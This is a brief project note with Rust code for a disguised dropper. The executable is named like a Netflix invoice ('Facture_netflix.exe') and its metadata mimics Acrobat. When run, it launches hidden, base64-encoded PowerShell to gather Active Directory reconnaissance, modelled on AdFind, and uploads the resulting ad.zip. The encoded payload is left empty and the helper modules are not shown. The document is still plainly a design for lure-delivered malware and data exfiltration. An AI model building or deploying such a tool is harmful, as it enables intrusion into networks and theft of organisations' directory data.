# Powershell AD 
ref: https://thedfirreport.com/2020/05/08/adfind-recon/
Same as adfind but in powershell

File name :  "Facture_netflix.exe"
# Code
main.rs
```rust
fn main() {
    let dropzone = r"C:\Users\Public\Downloads\";

    let pws_b64 = "";
    let pws_cmd = format!("-window hidden -enc {}",pws_b64);

    tools::run_exe("powershell", &pws_cmd,Some(dropzone));
        
    upload::io_file("C:\\Users\\Public\\Downloads\\ad.zip");
}
```

build.rs
```rust
let exe_metadata = Mimic::Acrobat;
```
